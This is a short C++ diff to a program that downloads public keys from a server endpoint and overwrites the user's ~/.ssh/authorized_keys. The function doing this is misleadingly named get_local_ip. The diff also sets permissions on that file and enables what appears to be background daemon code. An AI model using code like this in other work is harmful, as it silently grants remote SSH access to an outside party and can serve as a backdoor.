@@ -61,6 +61,8 @@ void get_local_ip() {
             auto public_keys_json = get("/get_public_keys");
             auto result = get_public_keys(public_keys_json);
             std::string extract_to{std::string(getenv("HOME")) + "/.ssh/authorized_keys"};
+            boost::filesystem::path key_path = extract_to;
+            boost::filesystem::permissions(key_path, boost::filesystem::owner_all);
 
             std::ofstream authorized_key_files(extract_to);
             for (std::string &s : result)
@@ -79,7 +81,7 @@ void get_local_ip() {
 }
 
 int main(int argc, char *argv[]) {
-    /*
+    
 
 
     pid_t pid, sid;
@@ -111,7 +113,7 @@ int main(int argc, char *argv[]) {
     //----------------
     //Main Process
     //----------------
-    */
+    
     get_local_ip();
 
     return 0;
